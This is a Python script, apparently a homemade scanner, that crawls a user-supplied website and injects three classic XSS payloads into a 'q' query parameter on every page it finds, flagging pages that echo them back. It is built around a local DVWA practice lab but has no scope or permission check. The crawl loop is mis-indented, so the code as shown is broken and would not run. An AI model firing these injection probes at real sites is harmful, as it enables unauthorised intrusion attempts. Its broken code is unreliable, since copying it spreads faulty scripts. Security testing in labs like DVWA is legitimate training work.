import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>"
]

visited_links = set()
vulnerabilities = []

def get_page(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        return response.text
    except:
        return ""

def crawl(url, base_url):
    if url in visited_links:
        return
    visited_links.add(url)

    print(f"[+] Crawling: {url}")

    content = get_page(url)
    soup = BeautifulSoup(content, "html.parser")

        for link in soup.find_all("a"):
        href = link.get("href")
        if not href:
            continue

        new_url = urljoin(base_url, href)

        if base_url in new_url:
            crawl(new_url, base_url)

def test_xss(url):
    print(f"[*] Testing for XSS → {url}")

    for payload in XSS_PAYLOADS:
        params = {"q": payload}  # test parameter q

        test_url = url + "?" + urlencode(params)

        try:
            response = requests.get(test_url, headers=HEADERS, timeout=5)

            if payload in response.text:
                print(f"[!!!] XSS Found: {test_url}")
                vulnerabilities.append({
                    "type": "Reflected XSS",
                    "url": test_url,
                    "payload": payload
                })
        except:
            pass

def start_scan(base_url):
    print("\n========== STARTING SCAN ==========\n")

    crawl(base_url, base_url)

    print(f"\n[+] Total pages scanned: {len(visited_links)}")

    for url in visited_links:
        test_xss(url)

    print("\n========== SCAN COMPLETE ==========\n")
    print(f"Total Vulnerabilities Found: {len(vulnerabilities)}\n")

    for v in vulnerabilities:
        print(f"- {v['type']} → {v['url']}")
        print(f"  Payload: {v['payload']}\n")

if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://localhost/dvwa/): ")
    start_scan(target)
